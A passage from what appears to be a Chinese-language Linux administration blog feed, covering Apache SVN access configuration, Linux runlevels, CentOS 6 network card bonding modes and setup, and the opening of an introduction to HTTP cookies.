/svn&gt;</span><br><span class="line">   DAV svn</span><br><span class="line">   SVNParentPath /svn</span><br><span class="line"></span><br><span class="line">   AuthType Basic</span><br><span class="line">   AuthName &quot;UnimationTech&quot;</span><br><span class="line">   AuthUserFile /svn/svnrepos/etc/.htpasswd</span><br><span class="line">   AuthzSVNAccessFile /svn/svnrepos/etc/authz</span><br><span class="line"></span><br><span class="line">   # Limit write permission to list of valid users.</span><br><span class="line">   #&lt;LimitExcept GET PROPFIND OPTIONS REPORT&gt;</span><br><span class="line">      # Require SSL connection for password protection.</span><br><span class="line">      # SSLRequireSSL</span><br><span class="line"> Require valid-user    -- 在其中时 svn 客户端下载将不会进行用户名验证</span><br><span class="line">   #&lt;/LimitExcept&gt;</span><br><span class="line">&lt;/Location&gt;</span><br></pre></td></tr></table></figure><p>【注】\<location\>和\<directiony\>的区别，\<location\>是虚拟目录，用\<location\>可以隐藏真实路径，而\<directory\>是直接使用真实路径</directory\></location\></location\></directiony\></location\></p><h4 id="htpasswd密码文件"><a href="#htpasswd密码文件" class="headerlink" title="htpasswd密码文件"></a>htpasswd密码文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">htpasswd -bc /svn/svnrepos/etc/.htpasswd root 123</span><br><span class="line">htpasswd -b /svn/svnrepos/etc/.htpasswd lg 123</span><br><span class="line">htpasswd -b /svn/svnrepos/etc/.htpasswd scb 123</span><br></pre></td></tr></table></figure><h4 id="权限修改"><a href="#权限修改" class="headerlink" title="权限修改"></a>权限修改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /svn/svnrepos/etc/.htpasswd        #修改权限提升安全性</span><br><span class="line">chown -R apache.apache /svn                  #最后别忘了修改版本库目录权限</span><br><span class="line">service httpd restart                        #重启服务</span><br><span class="line">chmod -R 700 /svn                            #权限</span><br></pre></td></tr></table></figure><h4 id="authz"><a href="#authz" class="headerlink" title="authz"></a>authz</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[groups]</span><br><span class="line">super_user = root</span><br><span class="line">manage_user =  wyh, cgq, lgl</span><br><span class="line">FA = lg, scb</span><br><span class="line">Special = ml, lhjn</span><br><span class="line">Service = hjw, zj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[svnrepos:/]</span><br><span class="line">@super_user = rw</span><br><span class="line">@manage_user = rw</span><br><span class="line">@FA = rw</span><br><span class="line">* = r</span><br><span class="line"></span><br><span class="line">[svnrepos:/FA]</span><br><span class="line">@super_user = rw</span><br><span class="line">@manage_user = rw</span><br><span class="line">@FA = rw</span><br><span class="line">* = </span><br><span class="line"></span><br><span class="line">[svnrepos:/Market_Department]</span><br><span class="line">@super_user = rw</span><br><span class="line">@manage_user = rw</span><br><span class="line">@Service = rw</span><br><span class="line">* = </span><br><span class="line"></span><br><span class="line">[svnrepos:/Services_Department]</span><br><span class="line">@super_user = rw</span><br><span class="line">@manage_user = rw</span><br><span class="line">@Service = rw</span><br><span class="line">* = </span><br><span class="line"></span><br><span class="line">[svnrepos:/Shared_Dir]</span><br><span class="line">@super_user = rw</span><br><span class="line">* = r</span><br><span class="line"></span><br><span class="line">[svnrepos:/Special_robot]</span><br><span class="line">@super_user = rw</span><br><span class="line">@manage_user = rw</span><br><span class="line">@Special = rw</span><br><span class="line">* =</span><br></pre></td></tr></table></figure><p>【参考】</p><p><a href="https://gangzai.online/2018/03/11/yunwei/Linux-SVN%E9%83%A8%E7%BD%B2/" target="_blank" rel="noopener">Linux-SVN部署</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux运行级别</title>
      <link href="/2018/04/23/yunwei/Linux%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB/"/>
      <url>/2018/04/23/yunwei/Linux%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="Linux-系统主要启动步骤"><a href="#Linux-系统主要启动步骤" class="headerlink" title="Linux 系统主要启动步骤"></a>Linux 系统主要启动步骤</h3><ol><li>读取 MBR 的信息，启动 Boot Manager。</li><li>加载系统内核，启动 init 进程， init 进程是 Linux 的根进程，所有的系统进程都是它的子进程。</li><li>init 进程读取 /etc/inittab 文件中的信息，并进入预设的运行级别。通常情况下 /etc/rcS.d/ 目录下的启动脚本首先被执行，然后是/etc/rcX.d/ 目录。</li><li>根据 /etc/rcS.d/ 文件夹中对应的脚本启动 Xwindow 服务器 xorg，Xwindow 为 Linux 下的图形用户界面系统。</li><li>启动登录管理器，等待用户登录。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Postgres@svn etc]$ cat /etc/inittab </span><br><span class="line"># inittab is only used by upstart for the default runlevel.</span><br><span class="line">#</span><br><span class="line"># Default runlevel. The runlevels used are:</span><br><span class="line">#   0 - halt (Do NOT set initdefault to this)</span><br><span class="line">#   1 - Single user mode</span><br><span class="line">#   2 - Multiuser, without NFS (The same as 3, if you do not have networking)</span><br><span class="line">#   3 - Full multiuser mode</span><br><span class="line">#   4 - unused</span><br><span class="line">#   5 - X11</span><br><span class="line">#   6 - reboot (Do NOT set initdefault to this)</span><br><span class="line"># </span><br><span class="line">id:5:initdefault:</span><br></pre></td></tr></table></figure><a id="more"></a><p><br></p><h4 id="运行级别"><a href="#运行级别" class="headerlink" title="运行级别"></a>运行级别</h4><p>​    0：关机。不能将系统缺省运行级别设置为0，否则无法启动。</p><p>　　1：单用户模式，只允许root用户对系统进行维护。</p><p>　　2：多用户模式，但不能使用<a href="http://www.chinabyte.com/keyword/NFS/" target="_blank" rel="noopener">NFS</a>(相当于Windows下的网上邻居)</p><p>　　3：字符界面的多用户模式。</p><p>　　4：未定义。</p><p>　　5：图形界面的多用户模式。</p><p>　　6：重启。不能将系统缺省运行级别设置为0，否则会一直重启。</p><p><strong>查看运行级别</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runlevel</span><br></pre></td></tr></table></figure><p><strong>切换运行级别</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init [0123456]</span><br></pre></td></tr></table></figure><p><strong>chkconfig 按运行级别启动开机服务</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --level 2345 sshd on</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux 网卡绑定</title>
      <link href="/2018/04/20/yunwei/Linux-%E7%BD%91%E5%8D%A1%E7%BB%91%E5%AE%9A/"/>
      <url>/2018/04/20/yunwei/Linux-%E7%BD%91%E5%8D%A1%E7%BB%91%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是bond"><a href="#什么是bond" class="headerlink" title="什么是bond"></a>什么是bond</h3><p>   网卡bond是通过多张网卡绑定为一个逻辑网卡，实现本地网卡的冗余，带宽扩容和负载均衡，在生产场景中是一种常用的技术。Kernels 2.4.12及以后的版本均供bonding模块，以前的版本可以通过patch实现。可以通过以下命令确定内核是否支持 bonding：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@svn bonding]# uname -r</span><br><span class="line">2.6.32-696.23.1.el6.x86_64</span><br><span class="line">[root@svn bonding]# </span><br><span class="line">[root@svn bonding]# </span><br><span class="line">[root@svn bonding]# cat /boot/config-2.6.32-696.23.1.el6.x86_64 | grep -i bonding</span><br><span class="line">CONFIG_BONDING=m</span><br></pre></td></tr></table></figure><a id="more"></a><p><br></p><h3 id="bond的模式"><a href="#bond的模式" class="headerlink" title="bond的模式"></a>bond的模式</h3><h4 id="mode-0（balance-rr）"><a href="#mode-0（balance-rr）" class="headerlink" title="mode=0（balance-rr）"></a>mode=0（balance-rr）</h4><p>​    表示负载分担round-robin，并且是轮询的方式比如第一个包走eth0，第二个包走eth1，直到数据包发送完毕。</p><p>​    优点：流量提高一倍</p><p>​    缺点：需要接入交换机做端口聚合，否则可能无法使用</p><h4 id="mode-1（active-backup）"><a href="#mode-1（active-backup）" class="headerlink" title="mode=1（active-backup）"></a>mode=1（active-backup）</h4><p>​    表示主备模式，即同时只有1块网卡在工作。</p><p>​    优点：冗余性高</p><p>​    缺点：链路利用率低，两块网卡只有1块在工作</p><h4 id="mode-2-balance-xor-平衡策略"><a href="#mode-2-balance-xor-平衡策略" class="headerlink" title="mode=2(balance-xor)(平衡策略)"></a>mode=2(balance-xor)(平衡策略)</h4><p>​    表示XOR Hash负载分担，和交换机的聚合强制不协商方式配合。（需要xmit_hash_policy，需要交换机配置port channel）</p><p>​    特点：基于指定的传输HASH策略传输数据包。缺省的策略是：(源MAC地址 XOR 目标MAC地址) % slave数量。其他的传输策略可以通过xmit_hash_policy选项指定，此模式提供负载平衡和容错能力</p><h4 id="mode-3-broadcast-广播策略"><a href="#mode-3-broadcast-广播策略" class="headerlink" title="mode=3(broadcast)(广播策略)"></a>mode=3(broadcast)(广播策略)</h4><p>​    表示所有包从所有网络接口发出，这个不均衡，只有冗余机制，但过于浪费资源。此模式适用于金融行业，因为他们需要高可靠性的网络，不允许出现任何问题。需要和交换机的聚合强制不协商方式配合。</p><p>​    特点：在每个slave接口上传输每个数据包，此模式提供了容错能力</p><h4 id="mode-4-802-3ad-IEEE-802-3ad-动态链接聚合"><a href="#mode-4-802-3ad-IEEE-802-3ad-动态链接聚合" class="headerlink" title="mode=4(802.3ad)(IEEE 802.3ad 动态链接聚合)"></a>mode=4(802.3ad)(IEEE 802.3ad 动态链接聚合)</h4><p>​    表示支持802.3ad协议，和交换机的聚合LACP方式配合（需要xmit_hash_policy）.标准要求所有设备在聚合操作时，要在同样的速率和双工模式，而且，和除了balance-rr模式外的其它bonding负载均衡模式一样，任何连接都不能使用多于一个接口的带宽。</p><p>​    特点：创建一个聚合组，它们共享同样的速率和双工设定。根据802.3ad规范将多个slave工作在同一个激活的聚合体下。外出流量的slave选举是基于传输hash策略，该策略可以通过xmit_hash_policy选项从缺省的XOR策略改变到其他策略。需要注意的是，并不是所有的传输策略都是802.3ad适应的，尤其考虑到在802.3ad标准43.2.4章节提及的包乱序问题。不同的实现可能会有不同的适应性。</p><p>​    必要条件：</p><p>​        条件1：ethtool支持获取每个slave的速率和双工设定</p><p>​        条件2：switch(交换机)支持IEEE802.3ad Dynamic link aggregation</p><p>​        条件3：大多数switch(交换机)需要经过特定配置才能支持802.3ad模式</p><h4 id="mode-5-balance-tlb-适配器传输负载均衡"><a href="#mode-5-balance-tlb-适配器传输负载均衡" class="headerlink" title="mode=5(balance-tlb)(适配器传输负载均衡)"></a>mode=5(balance-tlb)(适配器传输负载均衡)</h4><p>​    是根据每个slave的负载情况选择slave进行发送，接收时使用当前轮到的slave。该模式要求slave接口的网络设备驱动有某种ethtool支持；而且ARP监控不可用。</p><p>​    特点：不需要任何特别的switch(交换机)支持的通道bonding。在每个slave上根据当前的负载（根据速度计算）分配外出流量。如果正在接受数据的slave出故障了，另一个slave接管失败的slave的MAC地址。</p><p>​    必要条件：</p><p>​        ethtool支持获取每个slave的速率</p><h4 id="mode-6-balance-alb-适配器适应性负载均衡"><a href="#mode-6-balance-alb-适配器适应性负载均衡" class="headerlink" title="mode=6(balance-alb)(适配器适应性负载均衡)"></a>mode=6(balance-alb)(适配器适应性负载均衡)</h4><p>​    在5的tlb基础上增加了rlb(接收负载均衡receiveload balance).不需要任何switch(交换机)的支持。接收负载均衡是通过ARP协商实现的.</p><p>​    特点：该模式包含了balance-tlb模式，同时加上针对IPV4流量的接收负载均衡(receiveload balance, rlb)，而且不需要任何switch(交换机)的支持。接收负载均衡是通过ARP协商实现的。bonding驱动截获本机发送的ARP应答，并把源硬件地址改写为bond中某个slave的唯一硬件地址，从而使得不同的对端使用不同的硬件地址进行通信。来自服务器端的接收流量也会被均衡。当本机发送ARP请求时，bonding驱动把对端的IP信息从ARP包中复制并保存下来。当ARP应答从对端到达时，bonding驱动把它的硬件地址提取出来，并发起一个ARP应答给bond中的某个slave。使用ARP协商进行负载均衡的一个问题是：每次广播 ARP请求时都会使用bond的硬件地址，因此对端学习到这个硬件地址后，接收流量将会全部流向当前的slave。这个问题可以通过给所有的对端发送更新（ARP应答）来解决，应答中包含他们独一无二的硬件地址，从而导致流量重新分布。当新的slave加入到bond中时，或者某个未激活的slave重新激活时，接收流量也要重新分布。接收的负载被顺序地分布（round robin）在bond中最高速的slave上当某个链路被重新接上，或者一个新的slave加入到bond中，接收流量在所有当前激活的slave中全部重新分配，通过使用指定的MAC地址给每个 client发起ARP应答。下面介绍的updelay参数必须被设置为某个大于等于switch(交换机)转发延时的值，从而保证发往对端的ARP应答不会被switch(交换机)阻截。</p><h4 id="bond模式小结："><a href="#bond模式小结：" class="headerlink" title="bond模式小结："></a>bond模式小结：</h4><p>​    mode5和mode6不需要交换机端的设置，网卡能自动聚合。mode4需要支持802.3ad。mode0，mode2和mode3理论上需要静态聚合方式。</p><h3 id="配置bond"><a href="#配置bond" class="headerlink" title="配置bond"></a>配置bond</h3><ol><li><p>设置bond时，应将NetworkManager关闭;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service NetworkManager stop</span><br></pre></td></tr></table></figure></li><li><p>关闭开机自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --level 345 NetworkManager off</span><br></pre></td></tr></table></figure><p>​</p></li></ol><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境:"></a>测试环境:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@svn network-scripts]# uname -a</span><br><span class="line">Linux svn.domain 2.6.32-696.23.1.el6.x86_64 #1 SMP Tue Mar 13 22:44:18 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[root@svn network-scripts]# </span><br><span class="line">[root@svn network-scripts]# </span><br><span class="line">[root@svn network-scripts]# cat /etc/redhat-release </span><br><span class="line">CentOS release 6.9 (Final)</span><br><span class="line"></span><br><span class="line">网卡信息:</span><br><span class="line">2: em1: &lt;BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP&gt; mtu 1500 qdisc mq master bond0 state UP qlen 1000</span><br><span class="line">    link/ether d0:94:66:3f:30:3e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">3: em2: &lt;BROADCAST,MULTICAST,SLAVE,UP&gt; mtu 1500 qdisc mq master bond0 state UNKNOWN qlen 1000</span><br><span class="line">    link/ether d0:94:66:3f:30:3e brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure><h4 id="配置物理网卡"><a href="#配置物理网卡" class="headerlink" title="配置物理网卡:"></a>配置物理网卡:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@svn network-scripts]# cat /etc/sysconfig/network-scripts/ifcfg-em1 </span><br><span class="line">DEVICE=em1</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">ONBOOT=yes</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">MASTER=bond0</span><br><span class="line">SLAVE=yes </span><br><span class="line">[root@svn network-scripts]# cat /etc/sysconfig/network-scripts/ifcfg-em2 </span><br><span class="line">DEVICE=em2</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">ONBOOT=yes</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">MASTER=bond0</span><br><span class="line">SLAVE=yes</span><br></pre></td></tr></table></figure><h4 id="配置逻辑网卡"><a href="#配置逻辑网卡" class="headerlink" title="配置逻辑网卡"></a>配置逻辑网卡</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@svn network-scripts]# cat /etc/sysconfig/network-scripts/ifcfg-bond0 </span><br><span class="line">DEVICE=bond0</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">ONBOOT=yes</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=192.168.2.250</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">DNS2=8.8.8.8</span><br><span class="line">GATEWAY=192.168.2.1</span><br><span class="line">DNS1=114.114.114.114</span><br></pre></td></tr></table></figure><p>bond配置文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@svn modprobe.d]# cat /etc/modprobe.d/modprobe.conf  &#123;不存在此目录，可以直接放在/etc/下&#125;</span><br><span class="line">alias bond0 bonding</span><br><span class="line">options bond0 miimon=100 mode=6</span><br></pre></td></tr></table></figure><p>配置bond0的链路检查时间为100ms，模式为6。</p><p><strong>警告</strong></p><p>bond0获取mac地址有两种方式:</p><p>​    一种是从第一个活跃网卡中获取mac地址，然后其余的SLAVE网卡的mac地址都使用该mac地址；</p><p>​    另一种是使用fail_over_mac参数，是bond0使用当前活跃网卡的mac地址，mac地址或者活跃网卡的转换而变。  </p><p>vmware workstation 不支持第一种获取mac地址的方式，那么可以使用fail_over_mac=1参数，所以这里我们添加fail_over_mac=1参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias bond0 bonding</span><br><span class="line">options bond0 miimon=100 mode=6 fail_over_mac=1</span><br></pre></td></tr></table></figure><h4 id="加载bonding模块驱动"><a href="#加载bonding模块驱动" class="headerlink" title="加载bonding模块驱动"></a>加载bonding模块驱动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@svn modprobe.d]# modprobe bonding加载驱动</span><br></pre></td></tr></table></figure><p>使用lsmod查看是否加载成功:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@svn modprobe.d]# lsmod </span><br><span class="line">Module                  Size  Used by</span><br><span class="line">bonding               133013  0 </span><br><span class="line">nf_conntrack_ipv4       9218  2 </span><br><span class="line">nf_defrag_ipv4          1483  1 nf_conntrack_ipv4</span><br></pre></td></tr></table></figure><p>重新加载网络服务，用于启动bonding</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure><h4 id="查看绑定结果"><a href="#查看绑定结果" class="headerlink" title="查看绑定结果:"></a>查看绑定结果:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[root@svn modprobe.d]# cat /proc/net/bonding/bond0 </span><br><span class="line">Ethernet Channel Bonding Driver: v3.7.1 (April 27, 2011)</span><br><span class="line"></span><br><span class="line">Bonding Mode: load balancing (round-robin)</span><br><span class="line">MII Status: up</span><br><span class="line">MII Polling Interval (ms): 0</span><br><span class="line">Up Delay (ms): 0</span><br><span class="line">Down Delay (ms): 0</span><br><span class="line"></span><br><span class="line">Slave Interface: em1</span><br><span class="line">MII Status: up</span><br><span class="line">Speed: 100 Mbps</span><br><span class="line">Duplex: full</span><br><span class="line">Link Failure Count: 0</span><br><span class="line">Permanent HW addr: d0:94:66:3f:30:3e</span><br><span class="line">Slave queue ID: 0</span><br><span class="line"></span><br><span class="line">Slave Interface: em2</span><br><span class="line">MII Status: up</span><br><span class="line">Speed: Unknown</span><br><span class="line">Duplex: Unknown</span><br><span class="line">Link Failure Count: 0</span><br><span class="line">Permanent HW addr: d0:94:66:3f:30:3f</span><br><span class="line">Slave queue ID: 0</span><br></pre></td></tr></table></figure><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>分别轮换down掉网卡, 进行不同网段ping/ssh链接; 查看是否存在异常问题;</p><h4 id="删除Bond网卡绑定"><a href="#删除Bond网卡绑定" class="headerlink" title="删除Bond网卡绑定"></a>删除Bond网卡绑定</h4><ol><li><p>删除bond0设备文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /etc/sysconfig/network-scripts/ifcfg-bond0</span><br></pre></td></tr></table></figure></li><li><p>删除绑定的网卡配置文件内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MASTER=bond0</span><br><span class="line">SLAVE=yes</span><br></pre></td></tr></table></figure><p><strong>若忘记绑定网卡</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enp3s0f0: flags=<span class="number">6211</span>&lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line"></span><br><span class="line">enp3s0f1: flags=<span class="number">6211</span>&lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST&gt;  mtu <span class="number">1500</span></span><br></pre></td></tr></table></figure><p><code>ifconfig</code> 会发现网卡标志位 存在 <code>SLAVE</code> 标识。</p></li><li><p>删除modprobe.conf配置文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /etc/modprobe.d/modprobe.conf</span><br></pre></td></tr></table></figure></li><li><p>重启网络即可 <code>service network rerestart</code></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Cookie</title>
      <link href="/2018/04/19/network/Cookie/"/>
      <url>/2018/04/19/network/Cookie/</url>
      
        <content type="html"><![CDATA[<h3 id="Cookie简介"><a href="#Cookie简介" class="headerlink" title="Cookie简介"></a>Cookie简介</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Cookie（复数形态Cookies），中文名称为小型文本文件或小甜饼，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。定义于RFC2109。是网景公司的前雇员Lou Montulli在1993年3月的发明。</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>Cookie总是保存在客户端中，按在客户端中的存储位置，可分为内存Cookie和硬盘Cookie。</p><p>内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久Cookie和持久Cookie。</p><a id="more"></a><p><br></p><h3 id="Cookie的用途"><a href="#Cookie的用途" class="headerlink" title="Cookie的用途"></a>Cookie的用途</h3><p>通常Cookie有三种主要的用途。</p><h4 id="Session管理"><a href="#Session管理" class="headerlink" title="Session管理"></a>Session管理</h4><p>http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是Base Auth，但是这种方式，早期的网站用户名和密码在每次请求中会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。</p><p>所以现在大多数站点采用基于Cookie的Session管理方式：</p><p>当用户登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，（如果该Cookie尚未到期）浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。</p><h4 id="个性化"><a href="#个性化" class="headerlink" title="个性化"></a>个性化</h4><p>Cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。</p><p>在购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。</p><p>另一个个性化应用是广告定制。你访问过的网站会写入一些Cookies在你的浏览器里，这些Cookies会被一些广告公司用来售卖更精准的广告。比如你曾访问过一家汽车网站，那你浏览其他网站时可能就会看到一些汽车类的广告。</p><h4 id="User-Tracking"><a href="#User-Tracking" class="headerlink" title="User Tracking"></a>User Tracking</h4><p>Cookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。</p><h3 id="Cookie的基本特性"><a href="#Cookie的基本特性" class="headerlink" title="Cookie的基本特性"></a>Cookie的基本特性</h3><h4 id="http-request"><a href="#http-request" class="headerlink" title="http request"></a>http request</h4><p>浏览器向服务器发起的每个请求都会带上Cookie：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: foo=value1;bar=value2</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure><h4 id="http-response"><a href="#http-response" class="headerlink" title="http response"></a>http response</h4><p>服务器给浏览器的返回可以设置Cookie：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: name=value</span><br><span class="line">Set-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT</span><br><span class="line"></span><br><span class="line">(content of page)</span><br></pre></td></tr></table></figure><p>####Cookie识别功能的说明</p><p>如果在一台计算机中安装多个浏览器，每个浏览器都会以独立的空间存放Cookie。因为Cookie中不但可以确认用户信息，还能包含计算机和浏览器的信息，所以一个用户使用不同的浏览器登录或者用不同的计算机登录，都会得到不同的Cookie信息，另一方面，对于在同一台计算机上使用同一浏览器的多用户群，Cookie不会区分他们的身份，除非他们使用不同的用户名登录。</p><h3 id="Cookie有关的术语"><a href="#Cookie有关的术语" class="headerlink" title="Cookie有关的术语"></a>Cookie有关的术语</h3><h4 id="Session-Cookie"><a href="#Session-Cookie" class="headerlink" title="Session Cookie"></a>Session Cookie</h4><p>当Cookie没有设置超时时间，那么Cookie会在浏览器退出时销毁，这种Cookie是Session Cookie。</p><p>####Persistent Cookie/Tracking 